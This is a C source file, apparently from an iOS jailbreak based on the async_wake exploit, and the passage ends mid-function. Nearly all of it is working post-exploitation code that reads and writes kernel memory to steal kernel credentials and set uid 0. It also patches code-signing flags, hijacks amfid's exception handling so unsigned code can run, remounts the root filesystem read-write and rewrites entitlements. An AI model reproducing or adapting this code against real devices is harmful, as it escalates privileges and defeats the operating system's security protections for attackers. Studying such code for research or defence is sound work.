//
//  written_code_hiding_for_sanity.c
//  async_wake_ios
//
//
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <sys/fcntl.h>
#include <sys/mount.h>
#include <copyfile.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <pthread/pthread.h>
#include<sys/socket.h>
#include<arpa/inet.h>

#include "symbols.h"
#include "kmem.h"
#include "async_wake.h"
#include "cdhash.h"
#include "code_hiding_for_sanity.h"
#include <fcntl.h>
#include <sys/uio.h>
#include <mach-o/loader.h>
#include <mach/machine.h>
#include <stdint.h>
#include <string.h>
#include "sha256.h"
#include "kutils.h"
#include "find_port.h"

extern mach_port_t kernel_task_port;
extern uint64_t last_proc_impersonated;
extern uint64_t leaked_proc;
extern mach_port_t amfid_exception_port;
extern uint64_t amfid_base;

extern int proc_pidinfo(int pid, int flavor, uint64_t arg,  void *buffer, int buffersize);

// copy pasta from mach_portal
void* rmem(mach_port_t tp, uint64_t addr, uint64_t len) {
    kern_return_t err;
    vm_offset_t buf = 0;
    mach_msg_type_number_t num = 0;
    err = mach_vm_read(tp,
                       addr,
                       len,
                       &buf,
                       &num);
    if (err != KERN_SUCCESS) {
        printf("read failed\n");
        return NULL;
    }
    uint8_t* outbuf = malloc(len);
    memcpy(outbuf, (void*)buf, len);
    mach_vm_deallocate(mach_task_self(), buf, num);
    return outbuf;
}

// copy pasta from mach_portal
void* rkmem(uint64_t addr, uint64_t len) {
    return rmem(kernel_task_port, addr, len);
}

//copied from: https://github.com/maximehip/mach_portal/blob/0d7470ae0896519ba4a97d06dfc17d0b6eee1042/patch_amfid.c
void w8(mach_port_t tp, uint64_t addr, uint8_t val) {
    kern_return_t err =
    mach_vm_write(tp,
                  addr,
                  (vm_offset_t)&val,
                  1);
    if (err != KERN_SUCCESS) {
        printf("write failed\n");
    }
}

//copied from: https://github.com/maximehip/mach_portal/blob/0d7470ae0896519ba4a97d06dfc17d0b6eee1042/patch_amfid.c
void w32(mach_port_t tp, uint64_t addr, uint32_t val) {
    kern_return_t err =
    mach_vm_write(tp,
                  addr,
                  (vm_offset_t)&val,
                  4);
    if (err != KERN_SUCCESS) {
        printf("write failed\n");
    }
}

//copied from: https://github.com/maximehip/mach_portal/blob/0d7470ae0896519ba4a97d06dfc17d0b6eee1042/patch_amfid.c
void w64(mach_port_t tp, uint64_t addr, uint64_t val) {
    kern_return_t err =
    mach_vm_write(tp,
                  addr,
                  (vm_offset_t)&val,
                  8);
    if (err != KERN_SUCCESS) {
        printf("write failed\n");
    }
}

// reworked from mach_portal
uint64_t get_proc_block(uint32_t target)
{
    uint64_t proc = proc_for_pid(getpid());
    while (proc)
    {
        uint32_t pid = rk32(proc+0x10);
        if (pid == target)
        {
            //printf("[+]\tFound pid (%d) at 0x%llx\n", target, proc);
            return proc;
        }
        proc = rk64(proc);
    }
    printf("[i]\tCouldn't find the pid going forwards, going backwards!!!\n");
    proc = proc_for_pid(getpid());
    while (proc)
    {
        uint32_t pid = rk32(proc+0x10);
        if (pid == target)
        {
            //printf("[+]\tFound pid (%d) at 0x%llx\n", target, proc);
            return proc;
        }
        proc = rk64(proc + 0x8);
    }
    printf("[i]\tCouldn't find the pid!!!\n");
    return -1;
}

// copied from mach_portal
uint64_t find_proc(char* target_p_comm) {
  uint64_t proc = proc_for_pid(getpid());
  uint64_t struct_proc_p_comm_offset = 0x26e; // or could be 0x2e4
  
  for (int i = 0; i < 1000; i++) {
    char* p_comm = rkmem(proc+struct_proc_p_comm_offset, 0x10); // p_comm
    if (!p_comm){
      return 0;
    }
    if (strstr(p_comm, target_p_comm)) {
      free(p_comm);
      return proc;
    }
    
    free(p_comm);
    proc = rk64(proc);
  }
  return 0;
}

//taken from mach portal
/*
void copy_creds_from_to(uint64_t proc_from, uint64_t proc_to) {
  printf("Gonna copy creds from 0x%llx to 0x%llx\n", proc_from, proc_to);
  uint64_t creds_from = rk64(proc_from + 0x100); //struct_proc_p_ucred_offset
  printf("from creds: 0x%llx\n", creds_from);
  
  // leak the creds
  //wk32(creds_from + 0x10, 0x444444); //struct_kauth_cred_cr_ref_offset
  
  // replace our proc's cred point with it
  wk64(proc_to + 0x100, creds_from); //struct_proc_p_ucred_offset
  
  // and to all our threads' cached cred pointers
  uint64_t uthread = rk64(proc_to + 0x98); // struct_proc_p_uthlist_offset

  uint32_t csflags = rk32(proc_to+0x2a8);
  csflags |= CS_PLATFORM_BINARY|CS_INSTALLER|CS_GET_TASK_ALLOW;
  csflags &= ~(CS_RESTRICT|CS_KILL|CS_HARD);
  wk32(proc_to+0x2a8, csflags);
  
  //if (uthread != 0) {
  //  // update the uthread's cred
  //  wk64(uthread + 0x168, creds_from); //struct_uthread_uu_ucred_offset
  //  printf("updated this thread's uu_ucreds\n");
  //}
}
 */

// bail this
void copy_creds_from_to(uint64_t proc_from, uint64_t proc_to) {
  uint64_t creds_from = rk64(proc_from + 0x100); //struct_proc_p_ucred_offset
  printf("kernel creds: 0x%llx\n", creds_from);
  
  // leak the creds
  // WAT
  wk32(creds_from + 0x10, 0x444444); //struct_kauth_cred_cr_ref_offset
  
  // replace our proc's cred point with it
  wk64(proc_to + 0x100, creds_from);
  
  // and to all our threads' cached cred pointers
  uint64_t uthread = rk64(proc_to + 0x98); // struct_proc_p_uthlist_offset
  
  while (uthread != 0) {
    // update the uthread's cred
    wk64(uthread + 0x168, creds_from); // struct_uthread_uu_ucred_offset
    printf("updated this thread's uu_ucreds\n");
    
    // get the next thread
    uthread = rk64(uthread + 0x170); // struct_uthread_uu_list_offset
    printf("next uthread: 0x%llx\n", uthread);
  }
}

// reworked from mach_portal
void* amfid_exception_handler(void* arg){
    /*
     We're still not properly handling signed code, and once the jailbreak app get's backgrounded the
     exception handler fails, we need to figure out how to permanently stop amfid, and handle both
     signed and unsigned code
     
     Jan 5 06:57:18 nokia-388 kernel(AppleMobileFileIntegrity)[0] <Notice>: int _validateCodeDirectoryHashInDaemon(const char *, struct cs_blob *, unsigned int *, unsigned int *, int, bool, bool, char *): verify_code_directory returned 0x10004005
     */
    uint32_t size = 0x1000;
    mach_msg_header_t* msg = malloc(size);
    kern_return_t kr;
    for(;;){
        kern_return_t err;
        printf("[+]\t[e]\tcalling mach_msg to receive exception message from amfid\n");
        err = mach_msg(msg,
                       MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE, // no timeout
                       0,
                       size,
                       amfid_exception_port,
                       0,
                       0);
        if (err != KERN_SUCCESS){
            printf("[+]\t[e]\t\terror receiving on exception port: %s\n", mach_error_string(err));
        } else {
            printf("[+]\t[e]\t\tgot exception message from amfid!\n");
            //dword_hexdump(msg, msg->msgh_size);
            
            exception_raise_request* req = (exception_raise_request*)msg;
            
            mach_port_t thread_port = req->thread.name;
            mach_port_t task_port = req->task.name;
            _STRUCT_ARM_THREAD_STATE64 old_state = {0};
            mach_msg_type_number_t old_stateCnt = sizeof(old_state)/4;
            printf("[+]\t[e]\t\tsizeof(old_state)=0x%lx, sizeof(old_state)/4=0x%lx\n", sizeof(old_state), sizeof(old_state)/4);
            err = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&old_state, &old_stateCnt);
            if (err != KERN_SUCCESS){
                printf("[-]\t[e]\t\terror getting thread state: %s\n", mach_error_string(err));
                continue;
            }
            
            printf("[+]\t[e]\t\tgot thread state\n");
            //dword_hexdump((void*)&old_state, sizeof(old_state));
            
            _STRUCT_ARM_THREAD_STATE64 new_state;
            memcpy(&new_state, &old_state, sizeof(_STRUCT_ARM_THREAD_STATE64));
            
            // get the filename pointed to by X25
            char* filename = rmem(task_port, new_state.__x[25], 1024);
            printf("[+]\t[e]\t\tgot filename for amfid request: %s\n", filename);
            
            // parse that macho file and do a SHA1 hash of the CodeDirectory
            // scratch that do a sha256
            char* cdhash;
            cdhash = get_binary_hash(filename); //I'm honestly surprised this works
            // it took like 2 days of kernel crashing, failure, and depression
            // thanks Oban 14yr whiskey!
            
            kr = mach_vm_write(task_port, old_state.__x[24], (vm_offset_t)cdhash, 0x14);
            if (kr==KERN_SUCCESS)
            {
                printf("[+]\t[e]\t\twrote the cdhash into amfid\n");
            } else {
                printf("[+]\t[e]\t\tunable to write the cdhash into amfid!!!\n");
            }
            
            // also need to write a 1 to [x20]
            w32(task_port, old_state.__x[20], 1);
            new_state.__pc = (old_state.__lr & 0xfffffffffffff000) + 0x1000; // 0x2dacwhere to continue
//            int i;
//            for (i=0; i< 33; i++)
//                printf("[+]\t[e]\t\tx[%d] = 0x%llx\n", i, old_state.__x[i]);
            printf("[+]\t[e]\t\tOld PC: 0x%llx, New PC: 0x%llx\n", old_state.__pc, new_state.__pc);
//            char * filenameTrimmed = strrchr(filename, '/') + 1;
//            int pid = get_pid_from_name(filenameTrimmed);
//            printf("[+]\t[e]\t\t[%s] is coming up as pid (%d)\n", filenameTrimmed, pid);
            free(filename);

            // set the new thread state:
            //ARM_THREAD_STATE64
            err = thread_set_state(thread_port, 6, (thread_state_t)&new_state, sizeof(new_state)/4);
            if (err != KERN_SUCCESS) {
                printf("[+]\t[e]\t\tfailed to set new thread state %s\n", mach_error_string(err));
            } else {
                printf("[+]\t[e]\t\tset new state for amfid!\n");
            }
            
            exception_raise_reply reply = {0};
            
            reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(req->Head.msgh_bits), 0);
            reply.Head.msgh_size = sizeof(reply);
            reply.Head.msgh_remote_port = req->Head.msgh_remote_port;
            reply.Head.msgh_local_port = MACH_PORT_NULL;
            reply.Head.msgh_id = req->Head.msgh_id + 0x64;
            
            reply.NDR = req->NDR;
            reply.RetCode = KERN_SUCCESS;
            // MACH_SEND_MSG|MACH_MSG_OPTION_NONE == 1 ???
            err = mach_msg(&reply.Head,
                           1,
                           (mach_msg_size_t)sizeof(reply),
                           0,
                           MACH_PORT_NULL,
                           MACH_MSG_TIMEOUT_NONE,
                           MACH_PORT_NULL);
            
            mach_port_deallocate(mach_task_self(), thread_port);
            mach_port_deallocate(mach_task_self(), task_port);
            sleep(2);
            
            if (err != KERN_SUCCESS){
                printf("[-]\t[e]\tfailed to send the reply to the exception message %s\n", mach_error_string(err));
            } else{
                printf("[+]\t[e]\treplied to the amfid exception...\n");
            }
        }
    }
    return NULL;
}

//reworked from mach_portal
void set_exception_handler(mach_port_t amfid_task_port){
    // allocate a port to receive exceptions on:
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amfid_exception_port);
    mach_port_insert_right(mach_task_self(), amfid_exception_port, amfid_exception_port, MACH_MSG_TYPE_MAKE_SEND);
    
    kern_return_t err = task_set_exception_ports(amfid_task_port,
                                                 EXC_MASK_ALL,
                                                 amfid_exception_port,
                                                 EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES,  // we want to receive a catch_exception_raise message with the thread port for the crashing thread
                                                 ARM_THREAD_STATE64);
    if (err != KERN_SUCCESS){
        printf("[-]\t[h]\terror setting amfid exception port: %s\n", mach_error_string(err));
    } else {
        printf("[+]\t[h]\tset amfid exception port\n");
    }
    // spin up a thread to handle exceptions:
    pthread_t exception_thread;
    pthread_create(&exception_thread, NULL, amfid_exception_handler, NULL);
}

//reworked from mach_portal
kern_return_t mach_vm_region
(
 vm_map_t target_task,
 mach_vm_address_t *address,
 mach_vm_size_t *size,
 vm_region_flavor_t flavor,
 vm_region_info_t info,
 mach_msg_type_number_t *infoCnt,
 mach_port_t *object_name
 );
uint64_t amfid_MISValidateSignatureAndCopyInfo_import_offset = 0x4150; //0x40b8;
uint64_t binary_load_address(mach_port_t tp) {
    kern_return_t err;
    mach_msg_type_number_t region_count = VM_REGION_BASIC_INFO_COUNT_64;
    memory_object_name_t object_name = MACH_PORT_NULL; /* unused */
    mach_vm_size_t target_first_size = 0x1000;
    mach_vm_address_t target_first_addr = 0x0;
    struct vm_region_basic_info_64 region = {0};
    printf("[+]\tabout to call mach_vm_region\n");
    err = mach_vm_region(tp,
                         &target_first_addr,
                         &target_first_size,
                         VM_REGION_BASIC_INFO_64,
                         (vm_region_info_t)&region,
                         &region_count,
                         &object_name);
    
    if (err != KERN_SUCCESS) {
        printf("[-]\tfailed to get the region\n");
        return 0;
    }
    printf("[+]\tgot base address\n");
    
    return target_first_addr;
}

// patch amfid so it will allow execution of unsigned code without breaking amfid's own code signature
int patch_amfid(mach_port_t amfid_task_port){
    set_exception_handler(amfid_task_port);
    printf("[+]\tabout to search for the binary load address\n");
    amfid_base = binary_load_address(amfid_task_port);
    printf("[i]\tamfid load address: 0x%llx\n", amfid_base);
    w64(amfid_task_port, amfid_base+amfid_MISValidateSignatureAndCopyInfo_import_offset, 0x4141414141414140); // crashy
    return 0;
}

// Remount / as rw - patch by xerub, modified with Morpheous' symbol finding
// retrieved from: https://github.com/ninjaprawn/async_wake-fun/blob/85c32e3aa619ee96e1f7e7bedc64f97046aac30c/async_wake_ios/the_fun_part/fun.m
// discovered from: https://twitter.com/_argp/status/942429791520731136
void xerub_remount_code(uint64_t kaslr, int phone_type)
{
    #define NUMBASES 4
    // these 3 bases are for iPhones 81, 61, 72 reversed out of QiLin (see the jailbreak function for the
    //  corresponding addresses)
    uint64_t bases[NUMBASES] = {0xfffffff00760a000, 0xFFFFFFF007612000, 0xFFFFFFF007622000, 0xFFFFFFF007656000};
    printf("[i]\tAttempting to remount /...\n");
    //rootfs_vnode->vnode_val+0xd8->node_data->data+0x70->flags
    printf("[+]\tGot kaslr == 0x%llx\n", kaslr);
    vm_offset_t offset = 0xd8;
    uint64_t _rootvnode = kaslr + bases[phone_type] + 0x88;
    printf("[+]\tGot _rootvnode = 0x%llx\n", _rootvnode);
    uint64_t rootfs_vnode = rk64(_rootvnode);
    printf("[+]\tGot rootfs_vnode = 0x%llx\n", rootfs_vnode);
    uint64_t v_mount = rk64(rootfs_vnode + offset);
    uint32_t v_flag = rk32(v_mount + 0x70);
    printf("[+]\tv_mount=0x%llx\n"
           "[+]\tv_flag_location=0x%llx\n"
           "[+]\tv_flag_value=0x%x\n", v_mount, v_mount + 0x70, v_flag);
    //darwin-xnu/bsd/sys/mount.h
    #define MNT_RDONLY  0x00000001  /* read only filesystem */
    #define MNT_ROOTFS  0x00004000  /* identifies the root filesystem */
    printf("[+]\tSetting v_flag to 0x%x\n", v_flag & 0xFFFFBFFE);
    wk32(v_mount + 0x70, v_flag & 0xFFFFBFFE);
    char *nmz = strdup("/dev/disk0s1s1");
    int rv = mount("apfs", "/", MNT_UPDATE, (void *)&nmz);
    printf("[+]\t[fun] remounting: %d\n", rv);
    v_mount = rk64(rootfs_vnode + offset);
    wk32(v_mount + 0x70, (v_flag & 0xFFFFBFFE) | MNT_ROOTFS);
    if (rv >= 0) {
        printf("[+]\tWe successfully remounted the drive\n");
    } else {
        exit(-1);
    }
}

// Bryce's code
int copy_file_from_container(char* container_path, char *src, char *dest)
{
    char * full_src = malloc(strlen(container_path) + strlen(src) + 1);
    sprintf(full_src, "%s%s", container_path, src);
    printf("[+]\tCopying\n[+]\t\tFrom [%s]\n[+]\t\tto [%s]\n", full_src, dest);
    copyfile_state_t s;
    s = copyfile_state_alloc();
    if (!copyfile(full_src, dest, s, COPYFILE_DATA | COPYFILE_STAT))
    {
        copyfile_state_free(s);
        return 0;
    } else {
        printf("[d]\tERROR COPYING [%s] to [%s]\n", full_src, dest);
        return 1;
    }
}

// Bryce's code
int give_me_root_privs(mach_port_t tfp0)
{
    uint64_t my_proc_block = get_proc_block(getpid());
    void* data = 0;
    mach_msg_type_number_t sz;
    kern_return_t kr;
    kr = mach_vm_read(tfp0, (mach_vm_address_t)my_proc_block, (mach_vm_size_t)0x290, (vm_offset_t *)&data, &sz);
    if (kr != KERN_SUCCESS)
    {
        printf("[-]\tWe couldn't read the pcb block\n");
        return 1;
    }
    *((uint32_t *)data + 0xC) = 0; // set my task's uid and gid
    *((uint32_t *)data + 0xD) = 0;
    kr = mach_vm_write(tfp0, (mach_vm_address_t)my_proc_block, (vm_offset_t)data, (mach_msg_type_number_t)0x290);
    if (kr != KERN_SUCCESS)
    {
        printf("We couldn't write back the pcb block\n");
        return 1;
    }
    uint64_t cred_ptr = rk64(my_proc_block + 0x100);
    wk32(cred_ptr+0x18, 0);
    wk32(cred_ptr+0x18+4, 0);   
    wk32(cred_ptr+0x18+8, 0);
    uint64_t task_ptr = rk64(my_proc_block + 0x18);
    uint64_t flags_ptr = task_ptr + 0x2a8;
    uint32_t flags = rk32(flags_ptr);
    printf("[+]\tFlags here: 0x%x\n", flags);
    wk32(flags_ptr, flags | 0x20004005); //TF_PLATFORM = 0x400
    flags = rk32(flags_ptr);
    printf("[+]\tFlags here: 0x%x\n", flags);
    printf("[i]\tCurrent uid=0x%x, gid=0x%x\n", getpid(), getuid());
    if (getuid())
        return 1;
    return 0;
}

// reworked from benjibob's code
/* source https://github.com/benjibobs/async_wake/search?utf8=✓&q=task_self_addr&type= */
// he / she got it from ian beer i think
uint64_t impersonate(uint32_t target, mach_port_t tfp0)
{
    uint64_t my_proc_block=proc_for_pid(getpid());
    uint64_t cred = rk64(my_proc_block+0x100);
    uint64_t proc = get_proc_block(target);
    while (proc)
    {
        uint32_t pid = rk32(proc+0x10);
        if (pid == target) {
            // enable cs entitlements
            uint32_t csflags = rk32(proc+0x2a8);
            printf("[+]\tOld CS flags on our process 0x%x\n", csflags);
            csflags |= CS_PLATFORM_BINARY|CS_INSTALLER|CS_GET_TASK_ALLOW;
            csflags &= ~(CS_RESTRICT|CS_KILL|CS_HARD);
            //csflags |= 0x24004001; //taken from qilin
            printf("[+]\tSetting CS flags on our process 0x%x\n", csflags);
            wk32(my_proc_block+0x2a8, csflags);
            // give us platform rights and allow code signing entitlements
            
            // give us platform rights
            // darwin-xnu/osfmk/kern/task.h:258
            #define TF_PLATFORM             0x00000400                              /* task is a platform binary */
            uint64_t wat_addr = rk32(proc+0x18);
            uint32_t wat_val = rk32(wat_addr);
            wk32(wat_addr, wat_val | TF_PLATFORM);
            
            // overwrite our uid and gid with 0
            //mach_vm_write(tfp0, (mach_vm_address_t)proc+0xc, (vm_offset_t)&val, (mach_msg_type_number_t)sizeof(char));
            //mach_vm_write(tfp0, (mach_vm_address_t)proc+0xd, (vm_offset_t)&val, (mach_msg_type_number_t)sizeof(char));
            //int i;
            //for (i=0; i < 0xc; i++)
            //    mach_vm_write(tfp0, (mach_vm_address_t)rk64(my_proc_block+0x100) + 0x18 + i, (vm_offset_t)&val, (mach_msg_type_number_t)sizeof(char));

            // patch the credential structure
            printf("[d]\tPatching ourselves with pid(%d) at 0x%llx\n", pid, proc);
            leaked_proc = proc;
            printf("[d]\tOld creds: 0x%llx\n", rk64(my_proc_block+0x100));
            uint64_t credpatch = rk64(proc+0x100);
            printf("[d]\tPatching our creds with 0x%llx\n", credpatch);
            wk64(my_proc_block+0x100, credpatch);
            ///////////////////////////////////////////////////////////////////////////////
            //uint64_t uthread = rk64(my_proc_block + 0x98); // struct_proc_p_uthlist_offset
            //while (uthread != 0) {
                //// update the uthread's cred
                //wk64(uthread + 0x168, credpatch); // struct_uthread_uu_ucred_offset
                //printf("updated this thread's uu_ucreds\n");
                //// get the next thread
                //uthread = rk64(uthread + 0x170); // struct_uthread_uu_list_offset
                //printf("next uthread: 0x%llx\n", uthread);
            //}
            break;
        }
        proc = rk64(proc);
    }
    return cred;
}

// reworked from benjibob's code
/* source https://github.com/benjibobs/async_wake/search?utf8=✓&q=task_self_addr&type= */
uint64_t task_self_addr(void);
// DONT USE THIS AS IT ONLY LOOKS FORWARD, use get_proc_block
uint64_t proc_for_pid(uint32_t pid) {
    uint64_t task_self = task_self_addr();
    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    while (struct_task != 0) {
        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        uint32_t fpid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
        
        if (fpid == pid) {
            return bsd_info;
        }
        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
    }
    return -1;
}

// reworked from benjibob's code
/* source https://github.com/benjibobs/async_wake/search?utf8=✓&q=task_self_addr&type= */
void set_my_pid(uint64_t orig_cred)
{
    uint64_t bsd_task=proc_for_pid(getpid());
    wk64(bsd_task+0x100, orig_cred);
    //wk64(bsd_task+0x10, old_pid);
    //wk32(bsd_task+0x2c, old_pid);
    //uint64_t uthread = rk64(bsd_task + 0x98); // struct_proc_p_uthlist_offset
    //while (uthread != 0) {
        //// update the uthread's cred
        //wk64(uthread + 0x168, orig_cred); // struct_uthread_uu_ucred_offset
        //printf("updated this thread's uu_ucreds\n");
        //// get the next thread
        //uthread = rk64(uthread + 0x170); // struct_uthread_uu_list_offset
        //printf("next uthread: 0x%llx\n", uthread);
    //}
    //printf("[INFO]: new uid: %d\n", getuid());
}

// re'd from QiLin
void nerf_hammer_AMFID(uint32_t amfid_pid, void* amfid_exception_handler)
{
    kern_return_t kr;
    printf("Nerfing...\n");
    uint64_t buffer[0x9f];
    uint64_t export_handler_addr = 0x100004150 - 0x100000000; //_MISValidateSignatureAndCopyInfo@PLT - base
    
    mach_port_name_t amfid_port;
    kr = task_for_pid(mach_task_self(), amfid_pid, &amfid_port);
    if (kr != KERN_SUCCESS)
    {
        printf("[-]\tWe can't nerf, task_for_pid(mach_task_self(), amfid_pid, &amfid_port) failed!\n");
        return;
    } else {
        printf("Got amfid's task port: 0x%x\n", amfid_port);
    }
    //bsd/sys/proc_info.h:731
    #define PROC_PIDREGIONPATHINFO 8
    int pi = 0;
    pi = proc_pidinfo(amfid_pid,
                      PROC_PIDREGIONPATHINFO,
                      0,
                      &buffer[0],
                      0x9f*8);
    printf("Got 0x%x from proc_pidinfo\n", pi);
    //extern int setExceptionHandlerForTask(task_t a1, void* exceptionHandler);
    //extern void exceptionHandler(void* arg);
    //setExceptionHandlerForTask(amfid_port, amfid_exception_handler);
    pthread_t exception_thread;
    //mach_port_name_t t_port;
    extern mach_port_t amfid_exception_port; //referencing jailbreak.c, that will be shared with the thread
    mach_port_allocate(mach_task_self(), 1, &amfid_exception_port);
    mach_port_insert_right(mach_task_self(), amfid_exception_port, amfid_exception_port, 0x14);
    task_set_exception_ports(amfid_port, 0x1BFE, amfid_exception_port, 0x80000001, 6);
    //extern void exceptionHandler(mach_port_name_t a1);
    void *arg = 0;
    pthread_create(&exception_thread, 0, amfid_exception_handler, arg);

    uint64_t overwrite_addr = buffer[0xa] + export_handler_addr;
    mach_msg_type_number_t  sz = 0;
    uint64_t saved_mvsaci_addr = 0;
    mach_vm_read(amfid_port, overwrite_addr, 8, (vm_offset_t *)&saved_mvsaci_addr, &sz);
    printf("Here's the overwrite address: 0x%llx\n", overwrite_addr);
    printf("Here's the saved MVSACI address: 0x%llx\n", saved_mvsaci_addr);
    uint64_t crap = 0x214654434e45504f; // junk
    kr = mach_vm_write(amfid_port, overwrite_addr, (vm_offset_t)&crap, 8);
    if (kr != KERN_SUCCESS)
        printf("There was a problem overwiting the exported address\n");
}

// re'd from QiLin
void set_platform_attribs(uint64_t proc, mach_port_t tfp0)
{
    uint64_t task = rk64(proc+0x18);
    uint64_t platform_addr = task + 0x3a0;
    uint32_t platform = rk32(platform_addr);
    wk32(platform_addr, platform | 0x400);
    //set platform flags
    wk32(proc+0x279+0x2f, 0x24004001);
    //locate code signing block
    uint64_t vnode_info = rk64(0x248);
    printf("[i]\tvnode_info = 0x%llx\n", vnode_info);
    uint64_t ubc_block = rk64(vnode_info);
    printf("[i]\tubc_block = 0x%llx\n", ubc_block);
    uint64_t ubc_info = rk64(ubc_block+0x78);
    printf("[i]\tubc_info = 0x%llx\n", ubc_info);
    uint64_t blob = rk64(ubc_info+0x50);
    printf("[i]\tblob = 0x%llx\n", blob);
    mach_msg_type_number_t sz = 0;
    vm_offset_t* data;
    kern_return_t kr;
    kr = mach_vm_read(tfp0, (mach_vm_address_t)blob, (mach_vm_size_t)0xa8, (vm_offset_t *)&data, &sz);
    if (kr != KERN_SUCCESS)
    {
        //printf("[-]\tWe couldn't read the pcb block\n");
        return;
    }
    *(uint8_t *)(data + 0xA4) = (*(uint8_t *)(data + 0xA4) & 0xFE) | 1;
    *(uint32_t *)(data + 0xC) = *(uint32_t *)(data + 0xC) | OSSwapInt32(0x24004001);
    kr = mach_vm_write(tfp0, (mach_vm_address_t)blob, (vm_offset_t)data, (mach_msg_type_number_t)0xa8);
    if (kr != KERN_SUCCESS)
    {
        printf("[-]\tWe couldn't write back the pcb block\n");
        return;
    }
    printf("[d]\tPlatform attributes are correctly set for process 0x%llx\n", proc);
}

// re'd from QiLin
uint32_t exec_wrapper(char* prog_name,
                      char* arg1,
                      char* arg2,
                      char* arg3,
                      char* arg4,
                      char* arg5,
                      mach_port_t tfp0)
{
  pid_t pid = -1;
   if ( strstr(prog_name, "dropbear") ) // make sure dropbear has the right path
    setenv("PATH", "/jailbreak/bin:/jailbreak/usr/bin:/jailbreak/sbin:/jailbreak/usr/sbin:/jailbreak/usr/local/bin:/bin:/usr/bin:/sbin:/usr/sbin", 1);
  // fix perms just in case something went wrong during the copy
  chmod(prog_name, S_IRWXU | S_IRWXG | S_IRWXO);
  if (access(prog_name, X_OK))
  {
    printf("[X]\tThe file can't be made executable, something has gone wrong....\n");
    return pid;
  }
    pid = fork();
  if (!pid)
  {
    execl(prog_name, prog_name, arg1, arg2, arg3, arg4, arg5, 0);
    printf("[X]\tSomething went wrong, perhaps CS is borked or copy failed?\n");
    exit(0);
  } else {
    printf("[+]\tExecl was successful: [%s] pid %d\n", prog_name, pid);
    if (strstr(prog_name, "amfideb"))
    {
      sleep(5);
      printf("[+]\tgiving amfid port to the killer process\n");
      mach_port_name_t pid_port, amfid_port;
      uint64_t pid_proc = get_proc_block(pid);
      kern_return_t kr;
      printf("Got proc_block for amfid: 0x%llx\n", pid_proc);
      set_platform_attribs(pid_proc, tfp0);
      kr = task_for_pid(mach_task_self(), pid, &pid_port);
      printf("[+]\tkernel return for [task_for_pid(mach_task_self(), pid, &pid_port);] was %d\n", kr);

      kr = task_for_pid(mach_task_self(), get_pid_from_name("amfid"), &amfid_port);
      printf("[+]\tkernel return for [task_for_pid(mach_task_self(), get_pid_from_name(\"amfid\"), &amfid_port);] was %d\n", kr);

      kr = mach_port_insert_right(pid_port, 0xBB07, amfid_port, 0x11);
      printf("[+]\tkernel return for [mach_port_insert_right(pid_port, 0xBB07u, amfid_port, 0x11);] was %d\n", kr);

    }
    if (strstr(prog_name, "sysdiagnose")) // usually the modus operandi will be to wait for the pid to finish
                                          // but in the case of sysdiagnose we want to return ASAP
    {
    printf("[+]\tGot [%s %s] for pid %d\n", prog_name, arg1, pid);
    sleep(2); // wait for it to finish
    } else if (strstr(prog_name, "uicache") || strstr(prog_name, "amfideb") || strstr(prog_name, "ws"))
    {
        //do nothing
    } else {
      int stat_loc = 0;
      waitpid(pid, &stat_loc, 0);
    }
  }
  return pid; 
}

// RE'd from QiLin
void modify_entitlements(char* entitlements, mach_port_t tfp0)
{
    int i;
    mach_vm_size_t sz;
    uint64_t proc = get_proc_block(getpid());
    uint64_t vnode_info = rk64(proc+0x248);
    printf("[i]\tVNODE info : 0x%llx\n", vnode_info);
    uint64_t ubc_info = rk64(vnode_info+0xf*sizeof(uint64_t));
    printf("[i]\tMy UBC info is 0x%llx\n", ubc_info);
    uint64_t blob = rk64(ubc_info+0xa*sizeof(uint64_t));
    printf("[i]\tMy blob is here: 0x%llx\n", blob);
    uint64_t cs_blob = rk64(blob + 0x80);
    printf("[i]\tCD blob is at : 0x%llx (should end with .....93d)\n", cs_blob);
    uint64_t ent_blob_ptr = rk64(blob + 0x90);
    printf("[i]\tEntitlement blob is at: 0x%llx\n", ent_blob_ptr);
    uint32_t blob_size = ntohl(rk32(ent_blob_ptr+4));
    //dump_pointer(tfp0, ent_blob_ptr, 0x100);
    printf("[i]\tblob size: %d\n", blob_size);
    char* estring = malloc(blob_size);
    bzero(estring, blob_size);
    mach_vm_read_overwrite(tfp0,
                           (mach_vm_address_t)ent_blob_ptr,
                           (mach_vm_size_t)blob_size,
                           (mach_vm_address_t)estring,
                           &sz);
    printf("[+]\tEntitlement blob (%d bytes) @0x%llx: %s\n", blob_size, ent_blob_ptr, (char *)((uint64_t)estring+8));
    char* new_blob = alloca(blob_size);
    sprintf(new_blob, "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n%s\n</dict>\n</plist>\n", entitlements);
    // ok, we need to sha256 the old section to validate we are sha256'ing the right thing and comparing the sha256
    // to the proper hash location
    SHA256_CTX *ctx = malloc(sizeof(SHA256_CTX));
    sha256_init(ctx);
    sha256_update(ctx, (BYTE *)estring, blob_size);
    char* old_hash = malloc(0x20);
    sha256_final(ctx, (BYTE *)old_hash);
    free(ctx);
    printf("[i]\tHere's the old entitlentment hash: [");
    for (i=0;i<0x20;i++)
        printf("%02x", old_hash[i] & 0xff);
    free(old_hash);
    printf("]\n");
    uint32_t hash_offset = ntohl(rk32(cs_blob+0x10));
    uint32_t hash_type = rk32(cs_blob+0x25) & 0xff;
    uint32_t hash_bytes = rk32(cs_blob+0x24) & 0xff;
    char nspecial = ntohl(rk32(cs_blob+0x18)) & 0x0000FFFF;
    printf("[i]\tHash offset: 0x%x, Type: %d (%d bytes), nspecial = %d\n", hash_offset, hash_type, hash_bytes, nspecial);
    uint64_t hash_ptr = cs_blob + hash_offset - 5 * hash_bytes;
